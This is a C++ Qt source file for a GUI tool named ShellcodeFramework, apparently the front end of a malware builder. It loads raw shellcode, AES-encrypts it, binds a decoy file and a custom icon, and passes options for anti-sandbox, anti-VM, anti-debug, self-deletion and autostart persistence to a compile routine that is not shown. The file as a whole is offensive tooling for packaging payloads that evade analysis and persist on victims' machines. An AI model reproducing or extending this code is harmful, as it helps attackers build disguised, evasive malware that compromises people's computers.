#include "ShellcodeFramework.h"
#include "util.h"
#include <QFileDialog>
#include <QMessageBox>
#include <QString>
#include <string.h>

ShellcodeFramework::ShellcodeFramework(QWidget *parent)
    : QWidget(parent)
{
    ui.setupUi(this);
}


ShellcodeFramework::~ShellcodeFramework()
{}

void ShellcodeFramework::on_pushButton_clicked()
{

}

void ShellcodeFramework::on_open_Shellcode() {
    this->ui.stackedWidget->setCurrentIndex(1);
    return;
}


void ShellcodeFramework::on_pushButton_shellcode_clicked()
{
    this->ui.stackedWidget->setCurrentIndex(0);
}

void ShellcodeFramework::on_pushButton_Permissionmaintenance_clicked()
{
    this->ui.stackedWidget->setCurrentIndex(1);
}

void ShellcodeFramework::on_pushButton_shellcode_2_clicked()
{
    this->ui.stackedWidget->setCurrentIndex(0);
}

void ShellcodeFramework::on_pushButton_Permissionmaintenance_2_clicked()
{
    this->ui.stackedWidget->setCurrentIndex(1);
}

string EncryptShellcode = "";
string EncryptFilecontent = "";
void ShellcodeFramework::on_pushButtonShellcoderaw_clicked()
{
    QString fileName = QFileDialog::getOpenFileName(
        this,
        QString::fromLocal8Bit("选择文件"),
        "c:/",
        "All files (*.raw;*.bin)");
    if (fileName.isEmpty()) {
        QMessageBox::warning(this, "warning!", QString::fromLocal8Bit("请选择shellcode raw格式文件"));
    }
    else {
        QByteArray filecontent = loadFile(fileName);
        if (filecontent.length() <= 0) {
            QMessageBox::warning(this, "warning!", QString::fromLocal8Bit("没有任何内容!!!"));
            return;
        }
        else {
            this->ui.lineEditShellcodePath->setText(fileName);
            QByteArray bufferhex = filecontent.toHex();
            string buffer = bufferhex.toStdString();

            this->ui.textEdit->append("plain: \n" + QString::fromStdString(buffer) + "\n");

            EncryptShellcode = EncryptionAES(buffer);

            string DecryptShellcode = DecryptionAES(EncryptShellcode);

            this->ui.textEdit->append("encrypt: \n" + QString::fromStdString(EncryptShellcode) + "\n");
        }
    }
}

void ShellcodeFramework::on_pushButton_icon_clicked()
{
    QString fileName = QFileDialog::getOpenFileName(
        this,
        QString::fromLocal8Bit("选择文件"),
        "c:/",
        "All files (*.ico)");
    if (fileName.isEmpty()) {
        QMessageBox::warning(this, "warning!", QString::fromLocal8Bit("请选择ico图片文件"));
    }
    else {
        this->ui.lineEdit_icon->setText(fileName);
    }
}

void ShellcodeFramework::on_pushButton_file_clicked()
{
    QString fileName = QFileDialog::getOpenFileName(
        this,
        QString::fromLocal8Bit("选择文件"),
        "c:/",
        "All files (*.*)");
    if (fileName.isEmpty()) {
        QMessageBox::warning(this, "warning!", QString::fromLocal8Bit("请选择要绑定的文件"));
    }
    else {
        this->ui.lineEdit_file->setText(fileName);
        QByteArray filecontent = loadFile(fileName);

        QByteArray bufferhex = filecontent.toHex();
        string buffer = bufferhex.toStdString();


        EncryptFilecontent = EncryptionAES(buffer);

        string DecryptFilecontent = DecryptionAES(EncryptFilecontent);
        QString filename = "c:\\a.docx";
        writeFiledata(filename, QString::fromStdString(DecryptFilecontent).toUtf8());


        QString filenametest = this->ui.lineEdit_file->text();
        QStringList filenamename = filenametest.split("/");
        QString filenameright1 = filenamename.value(filenamename.length() - 1);
        this->ui.textEdit->append("filename: \n" + filenameright1 + "\n");

        // 测试输出
        this->ui.textEdit->append("encrypt binder file: \n" + QString::fromStdString(EncryptFilecontent) + "\n");
    }
}


void writeFiledatamy(QByteArray filedata) {
    QFile file("c:/a.txt");
    file.open(QIODevice::ReadWrite | QIODevice::Text);
    QByteArray str = filedata;
    file.write(str);
    file.close();
}

void ShellcodeFramework::on_pushButton_generate_clicked()
{
    this->ui.textEdit->append("============================================== \n");

    QString currentPath = QDir::currentPath();
    this->ui.textEdit->append(QString::fromLocal8Bit("当前路径: ") + currentPath + "\n");
    this->ui.textEdit->append("==============================================\n");

    bool isX64 = false;
    if (this->ui.radioButton_64->isChecked()) {
        isX64 = true;
        this->ui.textEdit->append(QString::fromLocal8Bit("编译类型: X64 \n"));
    }
    else {
        isX64 = false;
        this->ui.textEdit->append(QString::fromLocal8Bit("编译类型: X86 \n"));
    }
    this->ui.textEdit->append("============================================== \n");

    string pandingData = "";

    if (this->ui.checkBox_sandbox->isChecked()) {
        pandingData = "sandbox#";
        this->ui.textEdit->append("extern: Anti_sandbox \n");
    }
    if (this->ui.checkBox_vm->isChecked()) {
        pandingData = pandingData + "vm#";
        this->ui.textEdit->append("extern: Anti-vm \n");
    }
    if (this->ui.checkBox_delete->isChecked()) {
        pandingData = pandingData + "selfdelete#";
        this->ui.textEdit->append("extern: Self_delete \n");
    }
    if (this->ui.checkBox_protect->isChecked()) {
        pandingData = pandingData + "autostart";
        this->ui.textEdit->append("extern: Auto_protection \n");
    }
    this->ui.textEdit->append("all: " + QString::fromStdString(pandingData));
    this->ui.textEdit->append("inline extern: Anti-debug \n");
    this->ui.textEdit->append("============================================== \n");

    QString filepath = this->ui.lineEdit_file->text();
    string filenameString = "";
    if (filepath.length() > 0 && !filepath.isEmpty()) {
        QStringList filenames = filepath.split("/");
        QString filenameQstring = filenames.value(filenames.length() - 1);
        filenameString = filenameQstring.toStdString();
        this->ui.textEdit->append("file bunder name:" + QString::fromStdString(filenameString) + " \n");
    }

    compile(EncryptShellcode, isX64, pandingData, filenameString, EncryptFilecontent);
    pandingData = "";

    this->ui.textEdit->append("compile success, Please check outfile! \n");
    this->ui.textEdit->append("============================================== \n");
    return;
}

void ShellcodeFramework::on_pushButtonCleaner_clicked()
{
    this->ui.textEdit->setText("");
    return;
}